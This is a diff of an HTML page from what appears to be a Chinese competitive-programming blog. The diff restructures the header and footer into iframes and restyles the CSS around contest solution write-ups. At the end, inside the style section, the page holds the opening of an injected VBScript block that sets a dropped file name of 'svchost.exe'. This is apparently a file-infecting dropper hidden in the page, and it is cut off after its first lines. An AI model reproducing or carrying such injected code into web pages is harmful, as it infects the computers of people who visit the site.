@@ -6,17 +6,12 @@
 <link rel="icon" href="images/icon.ico">
 <body>
 
-<div id="header">
-<p>YRC的BLOG</p>
-</div>
-
-<div id="tree">
-<a href="index.html"><img src="images/home.png" height="70" width="70" alt="首页"/></a><br>
-<a href="article.html"><img src="images/article.png" height="70" width="70" alt="文章"/></a><br>
-<a href="team.html"><img src="images/team.png" height="70" width="70" alt="团队"/></a><br>
-</div>
+<iframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src="header.html" height="6%" width="100%"></iframe>
+<hr color="#2ECCFA"/>
 
 <div id="main">
+
+<div id="t">
 <h2>干物妹！小埋！第三弹 比赛题解</h2>
 <hr>
 <h2>Problem A（小埋与NOIP）：</h2>
@@ -106,7 +101,7 @@ int main()
 <p>又是字符串，不过这次复杂了很多，但脑洞就没有上次的Problem C（<a href="https://www.luogu.org/problemnew/show/T32632">小埋与TSF的密信</a>）那么大，可能很多人提交之后都会怀疑数据有问题，那你就错了，其实你们题目可能漏了一点没有看，那就是：</p>
 <h3>输入数据是密文！</h3>
 <p>本题的题意其实是让你按照加密过程的逆过程来解密，可能有人会连加密过程都看不懂，那我就图解一下吧：</p>
-<p><img src="images/m3c.jpg" alt="" /></p>
+<p><img src="images/m3c.jpg" height="20%" alt="" /></p>
 <h3>再简单点说其实就是先序遍历转中序遍历</h3>
 <p>附标程：</p>
 <pre><code class="language-cpp">#include&lt;bits/stdc++.h&gt;
@@ -150,45 +145,32 @@ int main()
 </p>
 </div>
 
-<div id="footer">
-Copyright dgsyrc.github.io<br/>
-update on 2018-08-13<br/>
- <br/>
+
 </div>
+
+<iframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src="footer.html" height="8%" width="100%"></iframe>
 
 </body>
 <style>
-#header {
-    height:50px;
-	font-size:18px;
-    font-weight:bold;
-    background-color:#00BFFF;
-    color:white;
-    text-align:center;
-	line-height:50px;
-}
-#tree {
-    line-height:30px;
-    background-color:#eeeeee;
-    height:321%;
-    width:70px;
-    float:left;
-    padding:6px;  
-}
 #main {
-    height:320%;
-    width:94%;
-    float:left;
-    padding:10px;  
-	float:center;
-	background-image:url(images/luogu.jpg);	
+    height:auto;
+    width:100%;
+    float:center;
+	background:url("images/art2.jpeg")top;
+	background-color:#585858;
 }
-#footer {
-    background-color:black;
-    color:white;
-    clear:both;
-    text-align:center;
-    padding:5px; 
+#t {
+   background-color:rgba(255,255,255,0.8);
+   text-align:left;
+   padding:10px;
+   width:60%;
+   height:auto;
+   float:center;
+   margin:auto;
+   top: 0;
+   left: 0;
+   right: 0;
+   bottom: 0;
 }
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
